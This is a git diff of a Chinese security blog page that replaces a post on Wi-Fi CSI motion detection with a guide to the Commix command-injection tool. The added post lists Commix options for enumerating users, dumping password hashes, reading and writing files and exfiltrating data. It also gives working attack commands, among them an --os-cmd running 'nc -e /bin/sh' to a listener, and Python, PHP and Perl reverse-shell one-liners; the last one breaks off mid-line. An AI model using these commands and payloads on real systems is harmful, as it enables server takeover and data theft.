@@ -86,22 +86,22 @@
 
 
 
-<meta name="description" content="环境安装需要用到CSI tool，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载清华的版本。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。
-需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。
-获取数据">
+<meta name="description" content="介绍项目地址：https://github.com/stasinopoulos/commix
+Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。
+使用12345678910111213141516171819202122232425262">
 <meta property="og:type" content="article">
-<meta property="og:title" content="基于CSI的移动目标侦测研究学习">
-<meta property="og:url" content="http://zer0yu.github.io/2017/01/21/基于CSI的移动目标侦测研究学习/index.html">
+<meta property="og:title" content="Commix命令详解">
+<meta property="og:url" content="http://zer0yu.github.io/2017/01/21/Commix命令详解/index.html">
 <meta property="og:site_name" content="ZEROYU">
-<meta property="og:description" content="环境安装需要用到CSI tool，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载清华的版本。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。
-需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。
-获取数据">
-<meta property="og:updated_time" content="2017-01-21T14:51:58.000Z">
+<meta property="og:description" content="介绍项目地址：https://github.com/stasinopoulos/commix
+Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。
+使用12345678910111213141516171819202122232425262">
+<meta property="og:updated_time" content="2017-01-21T15:00:27.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="基于CSI的移动目标侦测研究学习">
-<meta name="twitter:description" content="环境安装需要用到CSI tool，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载清华的版本。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。
-需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。
-获取数据">
+<meta name="twitter:title" content="Commix命令详解">
+<meta name="twitter:description" content="介绍项目地址：https://github.com/stasinopoulos/commix
+Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。
+使用12345678910111213141516171819202122232425262">
 
 
 
@@ -129,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://zer0yu.github.io/2017/01/21/基于CSI的移动目标侦测研究学习/"/>
+  <link rel="canonical" href="http://zer0yu.github.io/2017/01/21/Commix命令详解/"/>
 
 
 
 
 
-  <title> 基于CSI的移动目标侦测研究学习 | ZEROYU </title>
+  <title> Commix命令详解 | ZEROYU </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -301,7 +301,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/21/基于CSI的移动目标侦测研究学习/">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/21/Commix命令详解/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="ZEROYU">
@@ -325,7 +325,7 @@
             
             
               
-                基于CSI的移动目标侦测研究学习
+                Commix命令详解
               
             
           </h1>
@@ -340,7 +340,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-21T22:48:58+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-21T22:58:54+08:00">
                 2017-01-21
               </time>
             
@@ -359,8 +359,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/01/21/基于CSI的移动目标侦测研究学习/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/21/基于CSI的移动目标侦测研究学习/" itemprop="commentCount"></span>
+                <a href="/2017/01/21/Commix命令详解/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/21/Commix命令详解/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -370,7 +370,7 @@
 
           
           
-             <span id="/2017/01/21/基于CSI的移动目标侦测研究学习/" class="leancloud_visitors" data-flag-title="基于CSI的移动目标侦测研究学习">
+             <span id="/2017/01/21/Commix命令详解/" class="leancloud_visitors" data-flag-title="Commix命令详解">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -397,43 +397,10 @@
       
 
       
-        <h4 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h4><p>需要用到<a href="http://dhalperi.github.io/linux-80211n-csitool/" target="_blank" rel="external">CSI tool</a>，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载<a href="http://pan.baidu.com/s/1dDhFuNJ" target="_blank" rel="external">清华的版本</a>。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。</p>
-<p>需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。</p>
-<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">sudo</span> ./log_to_file tmp.dat</div></pre></td></tr></table></figure>
-<p>打开另一个终端，运行</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ping</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.1</span> <span class="selector-tag">-i</span> 0<span class="selector-class">.2</span></div></pre></td></tr></table></figure>
-<p>netlink文件夹中的tmp.dat就是采集的原始数据。</p>
-<h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p>使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。</p>
-<p>一个例子数据包里包含</p>
-<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">timestamp_low: <span class="number">4</span> (In the sample trace, timestamp_low is invalid and always <span class="number">4.</span>)</div><div class="line">bfee_count: <span class="number">72</span></div><div class="line">Nrx: <span class="number">3</span></div><div class="line">Ntx: <span class="number">1</span></div><div class="line">rssi_a: <span class="number">33</span></div><div class="line">rssi_b: <span class="number">37</span></div><div class="line">rssi_c: <span class="number">41</span></div><div class="line">noise: <span class="number">-127</span></div><div class="line">agc: <span class="number">38</span></div><div class="line">perm: [<span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]</div><div class="line">rate: <span class="number">256</span></div><div class="line">csi: [<span class="number">1</span>x3x30 double]</div></pre></td></tr></table></figure>
-<h2 id="环境安装-1"><a href="#环境安装-1" class="headerlink" title="环境安装"></a>环境安装</h2><p>需要用到<a href="http://dhalperi.github.io/linux-80211n-csitool/" target="_blank" rel="external">CSI tool</a>，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载<a href="http://pan.baidu.com/s/1dDhFuNJ" target="_blank" rel="external">清华的版本</a>。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。</p>
-<p>需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。</p>
-<h2 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h2><p>cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">sudo</span> ./log_to_file tmp.dat</div></pre></td></tr></table></figure>
-<p>打开另一个终端，运行</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ping</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.1</span> <span class="selector-tag">-i</span> 0<span class="selector-class">.2</span></div></pre></td></tr></table></figure>
-<p>netlink文件夹中的tmp.dat就是采集的原始数据。</p>
-<h2 id="读取数据-1"><a href="#读取数据-1" class="headerlink" title="读取数据"></a>读取数据</h2><p>使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。</p>
-<p>一个例子数据包里包含</p>
-<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">timestamp_low: <span class="number">4</span> (In the sample trace, timestamp_low is invalid and always <span class="number">4.</span>)</div><div class="line">bfee_count: <span class="number">72</span></div><div class="line">Nrx: <span class="number">3</span></div><div class="line">Ntx: <span class="number">1</span></div><div class="line">rssi_a: <span class="number">33</span></div><div class="line">rssi_b: <span class="number">37</span></div><div class="line">rssi_c: <span class="number">41</span></div><div class="line">noise: <span class="number">-127</span></div><div class="line">agc: <span class="number">38</span></div><div class="line">perm: [<span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]</div><div class="line">rate: <span class="number">256</span></div><div class="line">csi: [<span class="number">1</span>x3x30 double]</div></pre></td></tr></table></figure>
-<p>其中:</p>
-<ul>
-<li><strong>timestamp_low</strong> 是时间戳</li>
-<li><strong>bfee_count</strong> 数据包数量</li>
-<li><strong>Nrx,Ntx</strong> 分别表示接收端和发送端的天线数量</li>
-<li><strong>rssi_a, rssi_b, rssi_c</strong> 每个天线的RSSI数据，单位dB，</li>
-<li><strong>agc</strong> Automatic Gain Control</li>
-<li><strong>perm</strong> NIC重排列后的顺序结果，代表RF链路的顺序</li>
-<li><strong>rate</strong> 发送包的rate</li>
-<li><strong>csi</strong> CSI原始数据，是个Ntx×Nrx×30复数矩阵</li>
-</ul>
-<p>主要提取出CSI数据和timestamp_low。</p>
-<h4 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h4><p>为了避免相位的偏移的影响，需要将相位进行线性变换，参考论文，写出了以下Python代码:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> copy</div><div class="line">N = <span class="number">1000</span> <span class="comment"># N为采集的数据包数量</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">complexDecoding</span><span class="params">(raw_data)</span>:</span></div><div class="line">“””</div><div class="line">将原始数据转化为Python可识别的复数</div><div class="line">这里使用了第一个天线的数据raw_data[<span class="number">0</span>]</div><div class="line">第二根第三根天线数据下标分别为<span class="number">1</span>, <span class="number">2</span></div><div class="line">原始数据为a + bi, python为a + bj</div><div class="line">返回处理后的数据</div><div class="line">“””</div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(N):</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30 代表子载波数量，固定为30</span></div><div class="line"><span class="keyword">if</span> raw_data[<span class="number">0</span>][<span class="number">-1</span>] == ‘i’:</div><div class="line">data.append(complex(raw_data[<span class="number">0</span>][:<span class="number">-1</span>]+‘j’))</div><div class="line"><span class="keyword">else</span>:</div><div class="line">data.append(complex(raw_data[<span class="number">0</span>]))</div><div class="line"><span class="keyword">return</span> data</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAP</span><span class="params">(data)</span>:</span></div><div class="line">“””</div><div class="line">根据复数计算振幅和相位</div><div class="line">“””</div><div class="line">amplitudes = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</div><div class="line">phases = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</div><div class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(N):</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</div><div class="line">r = sqrt((data[i + m * <span class="number">30</span>].real) ** <span class="number">2</span> + (data[i + m * <span class="number">30</span>].imag) ** <span class="number">2</span>)</div><div class="line">amplitudes[m].append(r)</div><div class="line">phases[m].append(np.angle(data[i + m * <span class="number">30</span>]))</div><div class="line"><span class="keyword">return</span> (amplitudes, phases)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocessingPhase</span><span class="params">(phases)</span>:</span></div><div class="line">“””</div><div class="line">将相位进行线性变换</div><div class="line">index是 <span class="number">-28</span> 到 <span class="number">28</span> 根据 IEEE <span class="number">802.11</span>n 协议</div><div class="line">返回变换后的相位</div><div class="line">“””</div><div class="line">index = range(<span class="number">-28</span>,<span class="number">0</span>,<span class="number">2</span>) + [<span class="number">-1</span>, <span class="number">1</span>] + range(<span class="number">3</span>,<span class="number">28</span>, <span class="number">2</span>) + [<span class="number">28</span>]</div><div class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(N):</div><div class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">clear = <span class="keyword">True</span></div><div class="line">base = <span class="number">0</span></div><div class="line">tphases[m][<span class="number">0</span>] = phases[m][<span class="number">0</span>]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</div><div class="line"><span class="keyword">if</span> phases[m][i] – phases[m][i<span class="number">-1</span>] &gt; pi:</div><div class="line">base += <span class="number">1</span></div><div class="line">clear = <span class="keyword">False</span></div><div class="line"><span class="keyword">elif</span> phases[m][i] – phases[m][i<span class="number">-1</span>] &lt; -pi:</div><div class="line">base –= <span class="number">1</span></div><div class="line">clear = <span class="keyword">False</span></div><div class="line">tphases[m][i] = phases[m][i] – <span class="number">2</span> * pi * base</div><div class="line"><span class="keyword">if</span> clear == <span class="keyword">True</span>:</div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</div><div class="line">phases[m][i] = tphases[m][i] – (tphases[m][<span class="number">29</span>] – tphases[m][<span class="number">0</span>])</div><div class="line">* <span class="number">1.0</span> /(<span class="number">28</span> – (<span class="number">-28</span>)) * (index[i])</div><div class="line">– <span class="number">1.0</span> / <span class="number">30</span> * sum([tphases[m][j] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>)])</div><div class="line"><span class="keyword">return</span> phases</div></pre></td></tr></table></figure>
-<h4 id="参考论文"><a href="#参考论文" class="headerlink" title="参考论文"></a>参考论文</h4><ol>
-<li>PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information</li>
-</ol>
+        <h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>项目地址：<a href="https://github.com/stasinopoulos/commix" target="_blank" rel="external">https://github.com/stasinopoulos/commix</a></p>
+<p>Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。</p>
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">选项：</div><div class="line">    -<span class="ruby">v 　　　　　　　　　　VERBOSE详细程度级别（<span class="number">0</span>-<span class="number">1</span>，默认值：<span class="number">0</span>）。</span></div><div class="line">    -<span class="ruby">-version　　　　 　　显示版本号并退出。</span></div><div class="line">    -<span class="ruby">-output-dir=.. 　　设置自定义输出目录路径。</span></div><div class="line">    -<span class="ruby">s SESSION_FILE　　 从存储（.sqlite）文件加载会话。</span></div><div class="line">    -<span class="ruby">-flush-session　　 刷新当前目标的会话文件。</span></div><div class="line">    -<span class="ruby">-ignore-session　　忽略存储在会话文件中的结果。</span></div><div class="line"></div><div class="line">  目标：</div><div class="line">    -<span class="ruby">u URL，--url = URL　　目标URL。</span></div><div class="line">    -<span class="ruby">-url-reload　　　　　　在命令执行后重新加载目标URL。</span></div><div class="line">    -<span class="ruby">l LOGFILE　　　　　　　解析来自HTTP代理日志文件的目标和数据。</span></div><div class="line">    -<span class="ruby">-crawl = CRAWLDEPTH  从目标网址开始抓取网站（<span class="number">1</span>-<span class="number">2</span>，默认值：<span class="number">0</span>）。</span></div><div class="line"></div><div class="line">  请求：</div><div class="line">    -<span class="ruby">-data=DATA　　　　　　要通过POST发送的数据字符串。</span></div><div class="line">    -<span class="ruby">-host=HOST 　　　　　 HTTP主机头。</span></div><div class="line">    -<span class="ruby">-referer=REFERER 　　HTTP Referer标头。</span></div><div class="line">    -<span class="ruby">-user-agent=AGENT 　HTTP用户代理头。</span></div><div class="line">    -<span class="ruby">-random-agent　　　　使用随机选择的HTTP User-Agent头。</span></div><div class="line">    -<span class="ruby">-param-del=PDEL　　 设置分割参数值的字符。</span></div><div class="line">    -<span class="ruby">-cookie=COOKIE 　　 HTTP Cookie头。</span></div><div class="line">    -<span class="ruby">-cookie-del=CDEL 　 设置分割cookie值的字符。</span></div><div class="line">    -<span class="ruby">-headers=HEADERS　  额外标头（例如「Header1：Value1 \ nHeader2：Value2」）。</span></div><div class="line">    -<span class="ruby">-proxy=PROXY　　　　 使用HTTP代理（例如“<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">8080</span>”）。</span></div><div class="line">    -<span class="ruby">-tor　　　　　　　　　 使用Tor网络。</span></div><div class="line">    -<span class="ruby">-tor-port=...  　　  设置Tor代理端口（默认值：<span class="number">8118</span>）。</span></div><div class="line">    -<span class="ruby">-auth-url=...　　　  登录面板URL。</span></div><div class="line">    -<span class="ruby">-auth-data =AUTH 　　登录参数和数据。</span></div><div class="line">    -<span class="ruby">-auth-type =AUTH 　　HTTP认证类型（例如“基本”或“摘要”）。</span></div><div class="line">    -<span class="ruby">-auth-cred =AUTH 　　HTTP身份验证凭据（例如“admin：admin”）。</span></div><div class="line">    -<span class="ruby">-ignore-<span class="number">401</span>　　　　　 忽略HTTP错误<span class="number">401</span>（未授权）。</span></div><div class="line">    -<span class="ruby">-force-ssl　　　　　　强制使用SSL / HTTPS。</span></div><div class="line"></div><div class="line">  枚举：</div><div class="line">    这些选项可用于枚举目标主机。</div><div class="line">    -<span class="ruby">-all　　　　　　　　　　　　检索一切。</span></div><div class="line">    -<span class="ruby">-current-user　　　　　　 检索当前用户名。</span></div><div class="line">    -<span class="ruby">-hostname　　　　　　　　　检索当前主机名。</span></div><div class="line">    -<span class="ruby">-is-root　　　　　　　　　 检查当前用户是否具有root权限。</span></div><div class="line">    -<span class="ruby">-is-admin　　　　　　　　　检查当前用户是否具有管理员权限。</span></div><div class="line">    -<span class="ruby">-sys-info　　　　　　　　　检索系统信息。</span></div><div class="line">    -<span class="ruby">-users　　　　　　　　　　 检索系统用户。</span></div><div class="line">    -<span class="ruby">-passwords　　　　　　　　 检索系统用户密码散列。</span></div><div class="line">    -<span class="ruby">-privileges　　　　　　　 检索系统用户权限。</span></div><div class="line">    -<span class="ruby">-ps-version　　　　　　　 检索PowerShell的版本号。</span></div><div class="line"></div><div class="line">  文件访问：</div><div class="line">    这些选项可用于访问目标主机上的文件。</div><div class="line">    -<span class="ruby">-file-read = FILE ..　　从目标主机读取文件。</span></div><div class="line">    -<span class="ruby">-file-write = FIL ..　　写入目标主机上的文件。</span></div><div class="line">    -<span class="ruby">-file-upload = FI ..　　在目标主机上上传文件。</span></div><div class="line">    -<span class="ruby">-file-dest = FILE ..　　写入和/或上传到的主机的绝对文件路径。</span></div><div class="line"></div><div class="line">  模块：</div><div class="line">    这些选项可用于增加检测和/或注射能力。</div><div class="line">    -<span class="ruby">-icmp-exfil = IP<span class="number">_</span> ..<span class="string">'ICMP exfiltration'</span>注入模块。  （例如<span class="string">'ip_src = 192.168.178.1，ip_dst = 192.168.178.3'</span>）。</span></div><div class="line">    -<span class="ruby">-dns-server = DNS ..“DNS exfiltration”注入模块。　　（用于DNS筛选攻击的域名）。</span></div><div class="line">    -<span class="ruby">-shellshock“炮弹”注射模块。</span></div><div class="line">  注射：</div><div class="line">    这些选项可用于指定要插入和输入的参数,提供定制注入有效负载。</div><div class="line">    -<span class="ruby">p TEST_PARAMETER　　　　可测试参数。</span></div><div class="line">    -<span class="ruby">-suffix = SUFFIX　　　　注入有效负载后缀字符串。</span></div><div class="line">    -<span class="ruby">-prefix = PREFIX　　　　注入有效负载前缀字符串。</span></div><div class="line">    -<span class="ruby">-technique = TECH　　　指定要使用的进样技术。</span></div><div class="line">    -<span class="ruby">-maxlen = MAXLEN　　　 设置与时间相关的最大输出长度,注射技术（默认：<span class="number">10000</span>字符）。</span></div><div class="line">    -<span class="ruby">-delay = DELAY　　　　 设置与时间相关的注入的自定义时间延迟术（默认：<span class="number">1</span>秒）。</span></div><div class="line">    -<span class="ruby">-tmp-path = TMP_P ..  设置Web服务器的临时目录的绝对路径。</span></div><div class="line">    -<span class="ruby">-root-dir = SRV_R ..  设置Web服务器根目录的绝对路径。</span></div><div class="line">    -<span class="ruby">-alter-shell = AL ..  使用另一个os-shell（例如<span class="string">'Python'</span>）。</span></div><div class="line">    -<span class="ruby">-os-cmd = OS_CMD　　　 执行单个操作系统命令。</span></div><div class="line">    -<span class="ruby">-os = OS　　　　　　　　将后端操作系统强制为此值。</span></div><div class="line">    -<span class="ruby">-tamper = TAMPER　　　使用给定脚本篡改注射数据。</span></div><div class="line"></div><div class="line">  检测：</div><div class="line">    这些选项可用于自定义检测阶段。</div><div class="line"></div><div class="line">    -<span class="ruby">-level = LEVEL　　要执行的测试级别（<span class="number">1</span>-<span class="number">3</span>，默认值：<span class="number">1</span>）。</span></div><div class="line">    -<span class="ruby">-skip-calc　　　　在检测期间跳过数学计算</span></div><div class="line">    -<span class="ruby">-dependencies　　检查第三方（非内核）依赖关系。</span></div><div class="line">    -<span class="ruby">-skip-waf　　　　绕过启发式检测WAF / IPS / IDS保护。</span></div></pre></td></tr></table></figure>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">python commix.py –url=<span class="string">"http://192.168.1.4/test/test.php?addr=INJECT_HERE” --os-cmd="</span>nc -e /bin/sh <span class="number">192.168</span>.<span class="number">1.3</span> <span class="number">1234</span>″</div><div class="line"></div><div class="line"></div><div class="line">Freebuf给出的一些用法（http:<span class="regexp">//www</span>.freebuf.com/sectool/<span class="number">64030</span>.html）</div><div class="line"></div><div class="line">测试漏洞web应用Damn</div><div class="line"></div><div class="line">python commix.py --url=<span class="string">"http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#"</span> --data=<span class="string">"ip=INJECT_HERE&amp;submit=submit"</span> --cookie=<span class="string">"security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"</span></div><div class="line">使用注入攻击Payload参数测试php-Charts <span class="number">1.0</span></div><div class="line"></div><div class="line">python commix.py --url=<span class="string">"http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE"</span> --prefix=<span class="string">"//"</span> --suffix=<span class="string">"'"</span></div><div class="line">使用特殊的头和HTTP代理测试OWASP Mutillidae</div><div class="line"></div><div class="line">python commix.py --url=<span class="string">"http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php"</span> --data=<span class="string">"target_host=INJECT_HERE"</span> --headers=<span class="string">"Accept-Language:fr\nETag:123\n"</span> --proxy=<span class="string">"127.0.0.1:8081"</span></div><div class="line">使用ICMP渗漏（exfiltration）技术测试Persistence</div><div class="line"></div><div class="line">su -c <span class="string">"python commix.py --url="</span>http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">178.8</span>/debug.php<span class="string">" --data="</span>addr=<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="string">" --icmp-exfil="</span>ip_src=<span class="number">192.168</span>.<span class="number">178.5</span>,ip_dst=<span class="number">192.168</span>.<span class="number">178.8</span><span class="string">""</span></div><div class="line"> </div><div class="line"></div><div class="line">配合一些反弹shell</div><div class="line"></div><div class="line"><span class="number">1</span>. Python-<span class="keyword">reverse</span>-shell:</div><div class="line">　　python -c ‘import <span class="keyword">socket</span>,subprocess,os;<span class="keyword">s</span>=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\”<span class="number">192.168</span>.<span class="number">1.3</span>\”,<span class="number">1234</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([\”/bin/sh\”,\”-i\”]);’</div><div class="line"><span class="number">2</span>. PHP-<span class="keyword">reverse</span>-shell:</div><div class="line">　　php -r ‘\$sock=fsockopen(\”<span class="number">192.168</span>.<span class="number">1.3</span>\”,<span class="number">1234</span>);<span class="keyword">exec</span>(\”/bin/sh -i &lt;%263 &gt;%263 <span class="number">2</span>&gt;%263\”);’</div><div class="line"><span class="number">3</span>. Perl-<span class="keyword">reverse</span>-shell:</div><div class="line">　　perl -e ‘<span class="keyword">use</span> Socket;\$i=\”<span class="number">192.168</span>.<span class="number">1.3</span>\”;\$p=<span class="number">1234</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(\”tcp\”));<span class="keyword">if</span>(<span 